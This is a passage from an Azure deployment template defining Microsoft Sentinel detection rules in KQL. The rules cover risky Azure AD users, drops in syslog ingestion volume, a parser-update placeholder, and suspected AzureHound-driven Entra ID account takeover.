bv_rule_combined_string",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT30M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion",
            "Persistence",
            "PrivilegeEscalation",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-625: [RBA] Azure AD - {{TrueRiskLevel}} Risk User {{SrcUsername}}",
            "alertDescriptionFormat": "High Risk Users as identified by Azure AD P2 license.\n\n{{ExtendedDescription}}\n\nCategory: Azure AD\nMITRE: T1078\ntag: RBA\n{{bv_rule_combined_string}}"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "UserDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPAddress1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9041')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9041')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9041: [Health] Syslog - Ingestion - Decrease In Log Volumes PlaceHolder",
          "description": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected ranging from 1 to 99,999 per day. MITRE:  Category: Health tag: Health",
          "severity": "High",
          "enabled": false,
          "query": "let latency = 0h;  \nlet start_time = 1h;\nlet end_time = now(); \nlet DeviationSlider = 2;\nlet DeviationThreshold = 100;\nlet suppression_time = 2d;\nlet start_time_historical = 14d;   \nlet RecentAlerts = toscalar(SecurityAlert\n  |where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9061:'\n  |parse AlertName with * ' Decrease In ' * 'From ' host_name\n  |summarize make_set_if(host_name, isnotempty(host_name)), eventcount=count()\n  );      \nlet Previous9053Alerts = toscalar(SecurityAlert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has 'BV-9053:'\n  | parse AlertName with * 'offline' * '[' host ']'\n  | extend host = split(replace_string(host, '\"', ''), ',')\n  | summarize make_set_if(host, host[0] <> ''));         \nlet Baseline = Syslog\n| where TimeGenerated between (startofday(ago(start_time_historical)) .. endofday(ago(1d)))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9061_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize EventCount = count() by Computer, bin(TimeGenerated, 1d)\n| summarize percentile_EventCount_25=percentiles(EventCount, 25),percentile_EventCount_75=percentiles(EventCount, 75),percentile_EventCount50=percentiles(EventCount, 50),MaxCount=max(EventCount),AvgCount=avg(EventCount),MinCount=min(EventCount), NumberofDays = countif(isnotempty(TimeGenerated)) by Computer\n| extend CandleBody = percentile_EventCount_75 - percentile_EventCount_25\n      | extend MyDeviation = CandleBody * DeviationSlider\n      | where MyDeviation  > DeviationThreshold and NumberofDays >= 3\n      | where AvgCount between (1 .. 99999)\n;\nSyslog\n| where TimeGenerated between (startofday(ago(1d)) .. startofday(now()))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9061_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize TodayEventCount = count() by Computer\n| join kind=inner (Baseline) on Computer\n      | extend AlertThreshold = iff(MinCount < MyDeviation, MyDeviation-MinCount, MinCount-(MyDeviation))\n      , PercentBelowMin = round(100- ((TodayEventCount * 1.0)/(MinCount * 1.0) * 100), 2)\n                        |extend day_of_week = toint(dayofweek(now())/1d)\n                |extend day_name = case(\n                    day_of_week == '1', 'monday'\n                    ,day_of_week == '2', 'tuesday'\n                    ,day_of_week == '3', 'wednesday'\n                    ,day_of_week == '4', 'thursday'\n                    ,day_of_week == '5', 'friday'\n                    ,day_of_week == '6', 'saturday'\n                    ,day_of_week == '0', 'sunday'\n                    ,'')\n      | extend week_day = iff(day_name has_any ('saturday', 'sunday'), false, true)\n| extend threshold = case(\n    day_name has_any ('saturday', 'sunday'), 95, // Default weekend threshold\n    week_day == true, 60,                       // Default weekday threshold\n    50)\n// Apply configured thresholds if present\n| extend threshold = case(\n    day_name in (BV9061_CONFIG['THRESHOLD'][0]['day_name']), BV9061_CONFIG['THRESHOLD'][0]['value'],\n    week_day == BV9061_CONFIG['THRESHOLD'][1]['week_day'], BV9061_CONFIG['THRESHOLD'][1]['value'],\n    threshold)\n, PercentBelowMin = iff(PercentBelowMin < 0, -PercentBelowMin, PercentBelowMin)\n, PercentBelowAvg = round(100- ((TodayEventCount * 1.0)/(AvgCount * 1.0) * 100), 2)\n| where TodayEventCount < AlertThreshold or PercentBelowMin > threshold\n| where PercentBelowAvg > threshold\n| extend Tags = 'tag: Health' \n        , bv_start_time = now()\n        , bv_datatype = 'Syslog'\n        , bv_mss_category = 'Ingestion outlier'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - Decrease'\n        , bv_alarm_name = 'BV-9061'\n        , bv_alarm_threshold = threshold\n        , bv_alarm_value = PercentBelowMin\n        , bv_severity = 'medium'\n        , sourcetype = 'Syslog'          \n        , bv_src_dvc = Computer\n        , bv_event_count = TodayEventCount\n        , bv_min_count = MinCount\n        , bv_avg_count = round(AvgCount,0)\n        , bv_event_threshold = AlertThreshold\n        , bv_percent_below_avg = PercentBelowAvg              \n| extend ExtendedDescription = iff(TodayEventCount < AlertThreshold, strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \", representing a \", bv_percent_below_avg, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"),\n              strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \" with a previous minimum count of \", bv_min_count, \" representing a \", bv_alarm_value, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"))\n|project-keep  ExtendedDescription, Tags, sourcetype\n  , bv_* ",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9041: [Health] Syslog - Ingestion - Decrease In Log Volumes From {{bv_src_dvc}} PlaceHolder",
            "alertDescriptionFormat": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected ranging from 1 to 99,999 per day.\n{{ExtendedDescription}} \nCategory: Ingestion outlier\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9043')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9043')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9043: [Health] Syslog - Ingestion - Decrease In Log Volumes PlaceHolder",
          "description": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected to be greater than 100,000 per day. MITRE:  Category: Health tag: Health",
          "severity": "High",
          "enabled": false,
          "query": "let latency = 0h;  \nlet start_time = 1h;\nlet end_time = now(); \nlet DeviationSlider = 2;\nlet DeviationThreshold = 100;\nlet suppression_time = 2d;\nlet start_time_historical = 14d;   \nlet RecentAlerts = toscalar(SecurityAlert\n  |where TimeGenerated between (ago(suppression_time) .. now())\n  | where AlertName startswith 'BV-9064:'\n  |parse AlertName with * ' Decrease In ' * 'From ' host_name\n  |summarize make_set_if(host_name, isnotempty(host_name)), eventcount=count()\n  );      \nlet Previous9053Alerts = toscalar(SecurityAlert\n  | where TimeGenerated >= ago(start_time_historical)\n  | where AlertName has 'BV-9053:'\n  | parse AlertName with * 'offline' * '[' host ']'\n  | extend host = split(replace_string(host, '\"', ''), ',')\n  | summarize make_set_if(host, host[0] <> ''));         \nlet Baseline = Syslog\n| where TimeGenerated between (startofday(ago(start_time_historical)) .. endofday(ago(1d)))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9064_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize EventCount = count() by Computer, bin(TimeGenerated, 1d)\n| summarize percentile_EventCount_25=percentiles(EventCount, 25),percentile_EventCount_75=percentiles(EventCount, 75),percentile_EventCount50=percentiles(EventCount, 50),MaxCount=max(EventCount),AvgCount=avg(EventCount),MinCount=min(EventCount), NumberofDays = countif(isnotempty(TimeGenerated)) by Computer\n| extend CandleBody = percentile_EventCount_75 - percentile_EventCount_25\n      | extend MyDeviation = CandleBody * DeviationSlider\n      | where MyDeviation  > DeviationThreshold and NumberofDays >= 3\n      | where AvgCount >= 100000\n;\nSyslog\n| where TimeGenerated between (startofday(ago(1d)) .. startofday(now()))\n| project Computer, TimeGenerated, HostName\n| extend Computer = iif(isnotempty(Computer), HostName, Computer)\n| where isnotempty(Computer)\n| where tolower(Computer) matches regex tolower(BV9064_CONFIG['EXCLUDED_HOST']) == false and Computer !in~ (RecentAlerts) and Computer !in~ (Previous9053Alerts)\n| project Computer, TimeGenerated\n| summarize TodayEventCount = count() by Computer\n| join kind=inner (Baseline) on Computer\n      | extend AlertThreshold = iff(MinCount < MyDeviation, MyDeviation-MinCount, MinCount-(MyDeviation))\n      , PercentBelowMin = round(100- ((TodayEventCount * 1.0)/(MinCount * 1.0) * 100), 2)\n                        |extend day_of_week = toint(dayofweek(now())/1d)\n                |extend day_name = case(\n                    day_of_week == '1', 'monday'\n                    ,day_of_week == '2', 'tuesday'\n                    ,day_of_week == '3', 'wednesday'\n                    ,day_of_week == '4', 'thursday'\n                    ,day_of_week == '5', 'friday'\n                    ,day_of_week == '6', 'saturday'\n                    ,day_of_week == '0', 'sunday'\n                    ,'')\n      | extend week_day = iff(day_name has_any ('saturday', 'sunday'), false, true)\n| extend threshold = case(\n    day_name has_any ('saturday', 'sunday'), 95, // Default weekend threshold\n    week_day == true, 60,                       // Default weekday threshold\n    50)\n// Apply configured thresholds if present\n| extend threshold = case(\n    day_name in (BV9064_CONFIG['THRESHOLD'][0]['day_name']), BV9064_CONFIG['THRESHOLD'][0]['value'],\n    week_day == BV9064_CONFIG['THRESHOLD'][1]['week_day'], BV9064_CONFIG['THRESHOLD'][1]['value'],\n    threshold)\n, PercentBelowMin = iff(PercentBelowMin < 0, -PercentBelowMin, PercentBelowMin)\n, PercentBelowAvg = round(100- ((TodayEventCount * 1.0)/(AvgCount * 1.0) * 100), 2)\n| where TodayEventCount < AlertThreshold or PercentBelowMin > threshold\n| where PercentBelowAvg > threshold\n| extend Tags = 'tag: Health' \n        , bv_start_time = now()\n        , bv_datatype = 'Syslog'\n        , bv_mss_category = 'Ingestion outlier'\n        , bv_alarm_type = 'Usage'\n        , bv_alarm_subtype = 'Usage - Decrease'\n        , bv_alarm_name = 'BV-9064'\n        , bv_alarm_threshold = threshold\n        , bv_alarm_value = PercentBelowMin\n        , bv_severity = 'medium'\n        , sourcetype = 'Syslog'          \n        , bv_src_dvc = Computer\n        , bv_event_count = TodayEventCount\n        , bv_min_count = MinCount\n        , bv_avg_count = round(AvgCount,0)\n        , bv_event_threshold = AlertThreshold\n        , bv_percent_below_avg = PercentBelowAvg              \n| extend ExtendedDescription = iff(TodayEventCount < AlertThreshold, strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \", representing a \", bv_percent_below_avg, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"),\n              strcat(\"\\n\\nThe ingestion volume for the host \", bv_src_dvc, \" in the \", bv_datatype,\" table over the past few days is significantly lower compared to the daily average from the previous 14 days. Specifically, today's log count is \", bv_event_count, \" with a previous minimum count of \", bv_min_count, \" representing a \", bv_alarm_value, \"% decrease from the usual daily average of \", bv_avg_count,\" logs.\"))\n|project-keep  ExtendedDescription, Tags, sourcetype\n  , bv_* ",
          "queryFrequency": "P1D",
          "queryPeriod": "P14D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "P1D",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9043: [Health] Syslog - Ingestion - Decrease In Log Volumes From {{bv_src_dvc}} PlaceHolder",
            "alertDescriptionFormat": "This alert identifies a significant decrease in log volume for a specific host in the Syslog table. It compares the recent ingestion volume against the daily average calculated over the past 14 days, highlighting instances where a notable drop in logging activity occurs that may indicate data collection issues or system health problems.\nTo be considered, log volumes are expected to be greater than 100,000 per day.\n{{ExtendedDescription}} \nCategory: Ingestion outlier\n{{Tags}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-111111112')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-111111112')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-111111112: [Preview] Function Push",
          "description": "Used to push updates to the new BVIM parser tests MITRE: T1562 Category: BVIM tag: Preview",
          "severity": "Informational",
          "enabled": false,
          "query": "let router_list=bvim_router_facility_list; \nlet bvim_dev=bvim_development;\nlet bv_asn_lookup=bv_asn_lookup; \nlet LAURL = bv_loganalytic_lookup;\nlet becq = bec_query;   \nlet temp = bv_desc_temp;    \nlet bv_xd = bv_xd;\nlet bv_xd_signin=bv_xd_signin;\nlet AUTHORIZED_ADMINS_V2 = AUTHORIZED_ADMINS_V2;\nlet bv_esxi_host = bv_esxi_host;\nlet bv_rsa_host = bv_rsa_host;\nlet bv_940_alert_type_with_id = bv_940_alert_type_with_id;\nlet bv_940_msft_description = bv_940_msft_description;\nlet MITRE_MATRIX_DATATABLE = MITRE_MATRIX_DATATABLE;\nlet KILL_CHAIN_DESCRIPTION = KILL_CHAIN_DESCRIPTION;\nlet MITRE_TO_KILL_CHAIN = MITRE_TO_KILL_CHAIN;\nlet bv_sonicwall_events = bv_sonicwall_events;\nunion \nbvim_mapping                       \n,bvim_mapping_rule           \n, bvim_schema_validator      \n, bvim_aadsts   \n, bv_authentication_method_okta \n, bv_authentication_reason_okta      \n, bv_change_okta \n, bvim_win_changecategory     \n, bvim_win_logonstatus     \n, bv_country_code     \n, bvim_alert_action_palo_threat  \n, bv_iis_vendoraction_lookup  \n, bvim_validator_logic_app    \n, bvim_intel  \n, bv_authentication_reason_fgt_event\n, bv_authentication_reason_rsa_secureid    \n, bv_network_action_fgt    \n, bv_alert_global_config    \n, bv_change_matid \n, bvim_test(ago(10m),now(),'no') \n, bv_workbook_lookup\n,bv_datavalue_winseventid  \n, bv_xd\n, bv_xd_signin\n, bv_xd_email_by_sender  \n, bv_xd_alert_summaries\n, bv_xd_alert_details\n, bv_xd_help\n, bv_xd_account_details\n, bv_xd_table_counts\n, bv_xd_alert_signature_summaries\n, bv_xd_ip_host_lookup\n, bv_authentication_reason_ciscoise\n, bv_critical_app_role\n, a920_query \n| extend bv_rule_timestamp = '1689346803.0704753'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.0.3792 bv_rule_timestamp: 1689346803.0704753'   \n|limit 0  ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Used to push updates to the new BVIM parser tests \n\ntag: Preview\n\nCategory:BVIM\n{{bv_rule_combined_string}}\n{{bv_rule_combined_string}}"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1936')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1936')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1936: [SOC] EntraID - Suspected AzureHound Based Account Takeover",
          "description": "This rule detects suspected account takeover attempts using the AzureHound client user agents against Microsoft 365 environments. Correlates authentication events across SigninLogs, AADNonInteractiveSignInLogs, and AADUserRiskEvents to identify high-confidence compromise indicators. MITRE: T1078,T1187,T1557 Category: Entra ID tag: SOC",
          "severity": "Medium",
          "enabled": true,
          "query": "let alert_id = 'BV-1936';\nlet alert_type = 'SOC';\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet start_time_suppress = 1d;\nlet latency = 1h;\nlet start_time = 4h;\nlet end_time = now();\nlet alert_bin = 1h;\nlet global_config = dynamic({\n'EXCLUSION': dynamic([{}]), 'excluded_dedup_hash_fields': dynamic([''])});\nlet exclusions = array_concat(global_config['EXCLUSION'], BV1936_CONFIG['EXCLUSIONS'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV1936_CONFIG['RBASCORE']),1.0);\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\n let match = (table_parameter: (*), items:dynamic, match_type: string){\n        table_parameter\n        | extend all_data = pack_all()\n        | mv-apply e = items on (\n            extend keys = bag_keys(e)\n            | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n            | mv-apply k = keys to typeof(string) on (\n                extend list = split(e[k],',')\n                | mv-apply l = list to typeof(string) on (\n                    extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                    | mv-apply i = item to typeof(string) on (\n                        extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                        | summarize excluded_count = countif(compare)\n                        | extend item_excluded = excluded_count > 0\n                    )\n                    | summarize excluded_count = countif(item_excluded)\n                    | extend item_excluded = excluded_count > 0\n                )\n                | summarize excluded_list_item = countif(item_excluded > 0)\n            )\n            | extend matched =  key_count == excluded_list_item and key_count != 0\n            | extend visibility = iff(matched and isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n            | extend bv_exclusion_reason = iff(matched, parse_json(e.metadata).reason, '')\n            | summarize matched=make_set(matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n        )\n        | extend match_status = iff(matched contains \"true\", match_type, '')\n};\n let description = (table_parameter: (*), excluded_fields:dynamic=dynamic(['']), max_field_length:int=300, max_array_length:int=5){\n    table_parameter\n    | extend all_data = pack_all()\n    | extend keys = bag_keys(all_data)\n    | mv-apply k = keys to typeof(string) on (\n        extend dynamic_entity = todynamic(trim(' ',tostring(all_data[k])))\n        | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (excluded_fields)), strcat(\n            case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(dynamic_entity)[0]) and array_length(dynamic_entity) > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(dynamic_entity,0,(max_array_length-1)),'\\n* '),0,max_field_length), '\\n')\n            , gettype(dynamic_entity) != 'array' and isnotempty(array_sort_desc(pack_array(tostring(all_data[k])))[0]), strcat(k,': ', dynamic_entity)\n            , gettype(dynamic_entity) == 'array' and array_length(dynamic_entity) == 1, strcat(k,': ', dynamic_entity[0])\n            , '')\n            ),'')\n            | summarize ExtendedDescription = make_set(ExtendedDescription)\n    )\n    | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n}; \nlet bv_AzureHound = bv_1936_query(starttime=ago(latency + start_time), endtime=end_time);\nbv_AzureHound\n| extend ConsolidatedSeverity = case(\nsilSeverity == \"High\" or AlertSeverity == \"High\" or nonInteractiveSeverity == \"High\", \"High\",\nsilSeverity == \"Medium\" or AlertSeverity == \"Medium\" or nonInteractiveSeverity == \"Medium\", \"Medium\",\n\"Low\"\n),\nDataSources = strcat(\n  \"SigninLogs,\",\n  iif(isnotempty(AADRisk_EventCount), \"AADUserRiskEvents,\", \"\"),\n  iif(isnotempty(AADNonInteractive_EventCount), \"AADNonInteractiveUserSignInLogs,\", \"\")\n),\nCrossSourceRisk = case(\n  isnotempty(AADRisk_EventCount) and isnotempty(AADNonInteractive_EventCount), \"Interactive+NonInteractive+Risk\",\n  isnotempty(AADRisk_EventCount), \"Interactive+Risk_Events\",\n  isnotempty(AADNonInteractive_EventCount) and SignInLogs_SuccessfulLogins > 0, \"Interactive+NonInteractive_Success\", \n  isnotempty(AADNonInteractive_EventCount), \"Interactive+NonInteractive\",\n  \"SigninLogs_Only\"\n),\nConsolidatedFirstSeen = case(\n  isnotempty(SignInLogs_FirstSeen) and isnotempty(AADNonInteractive_FirstSeen) and isnotempty(AADRisk_FirstSeen), \n    min_of(SignInLogs_FirstSeen, AADNonInteractive_FirstSeen, AADRisk_FirstSeen),\n  isnotempty(SignInLogs_FirstSeen) and isnotempty(AADNonInteractive_FirstSeen), \n    min_of(SignInLogs_FirstSeen, AADNonInteractive_FirstSeen),\n  isnotempty(SignInLogs_FirstSeen) and isnotempty(AADRisk_FirstSeen), \n    min_of(SignInLogs_FirstSeen, AADRisk_FirstSeen),\n  SignInLogs_FirstSeen\n),\nConsolidatedLastSeen = case(\n  isnotempty(SignInLogs_LastSeen) and isnotempty(AADNonInteractive_LastSeen) and isnotempty(AADRisk_LastSeen), \n    max_of(SignInLogs_LastSeen, AADNonInteractive_LastSeen, AADRisk_LastSeen),\n  isnotempty(SignInLogs_LastSeen) and isnotempty(AADNonInteractive_LastSeen), \n    max_of(SignInLogs_LastSeen, AADNonInteractive_LastSeen),\n  isnotempty(SignInLogs_LastSeen) and isnotempty(AADRisk_LastSeen), \n    max_of(SignInLogs_LastSeen, AADRisk_LastSeen),\n  SignInLogs_LastSeen\n)\n| project\nbv_dest_user = UserPrincipalName,\nbv_user = UserPrincipalName,\nbv_user_id = coalesce(UserId, \"\"),\nbv_dest_user_display = UserDisplayName,\nbv_start_time = ConsolidatedFirstSeen,\nbv_end_time = ConsolidatedLastSeen,\nbv_http_user_agent = coalesce(SignInLogs_SampleUserAgent, AADNonInteractive_SampleUserAgent, AADRisk_SampleUserAgent),\nbv_severity = ConsolidatedSeverity,\nbv_data_sources = DataSources,\nbv_attack_stage = CrossSourceRisk,\nbv_total_events = coalesce(SignInLogs_EventCount, 0) + coalesce(AADNonInteractive_EventCount, 0) + coalesce(AADRisk_EventCount, 0),\nbv_azurehound_versions = array_sort_asc(array_concat(coalesce(SignInLogs_AzureHoundVersions, dynamic([])), coalesce(AADNonInteractive_AzureHoundVersions, dynamic([])), coalesce(AADRisk_AzureHoundVersions, dynamic([])))),\nbv_src_ip = array_sort_asc(array_concat(coalesce(SignInLogs_IPs, dynamic([])), coalesce(AADNonInteractive_IPs, dynamic([])), coalesce(AADRisk_IPs, dynamic([])))),\nbv_correlation_ids = array_sort_asc(array_concat(coalesce(SignInLogs_CorrelationIds, dynamic([])), coalesce(AADNonInteractive_CorrelationIds, dynamic([])), coalesce(AADRisk_CorrelationIds, dynamic([])))),\nbv_signin_successful = coalesce(SignInLogs_SuccessfulLogins, 0),\nbv_signin_failed = coalesce(SignInLogs_FailedLogins, 0),\nbv_signin_apps = coalesce(SignInLogs_Apps, dynamic([])),\nbv_signin_locations = coalesce(SignInLogs_Locations, dynamic([])),\nbv_noninteractive_successful = coalesce(AADNonInteractive_SuccessfulLogins, 0),\nbv_noninteractive_failed = coalesce(AADNonInteractive_FailedLogins, 0),\nbv_noninteractive_apps = coalesce(AADNonInteractive_Apps, dynamic([])),\nbv_noninteractive_methods = coalesce(AADNonInteractive_AuthMethods, dynamic([])),\nbv_risk_active = coalesce(AADRisk_ActiveRisks, 0),\nbv_risk_types = coalesce(AADRisk_RiskTypes, dynamic([])),\nbv_risk_high_events = coalesce(AADRisk_HighRiskEvents, 0),\nbv_consolidated_risk_factors = array_concat(coalesce(SignInLogs_RiskFactors, dynamic([])), coalesce(AADNonInteractive_RiskFactors, dynamic([])), coalesce(AADRisk_RiskFactors, dynamic([]))),\nbv_sourcetypes = DataSources\n| invoke match(exclusions, 'exclusion')\n| where match_status != 'exclusion'  \n| invoke description(excluded_description_fields, 300, 5)\n| extend bv_alarm_rba_score = BV_FUN_CALC_RBA(alert_id, visibility, rba_score)\n     , bv_dedup_hash = hash_sha1(bv_user)\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash    \n| extend bv_alarm_victim_entities = pack_array(bv_user),\n  bv_alarm_attacker_entities = pack_array(bv_src_ip),\n  bv_src_ip1 = bv_src_ip[0], bv_src_ip2 = bv_src_ip[1], bv_src_ip3 = bv_src_ip[2]\n | extend ExtendedDescription = strcat(\"At this time we would recommend investigating the user \", bv_dest_user, \" (\", bv_dest_user_display, \") as it was determined that the user has been seen interacting with the potentially malicous tool \", bv_http_user_agent, \". At this time we would recommend investigating the tables: \", bv_data_sources, '\\n\\n', ExtendedDescription)\n| project-keep bv_*, ExtendedDescription",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CredentialAccess",
            "Collection"
          ],
          "techniques": [
            "T1078",
            "T1187",
            "T1557"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
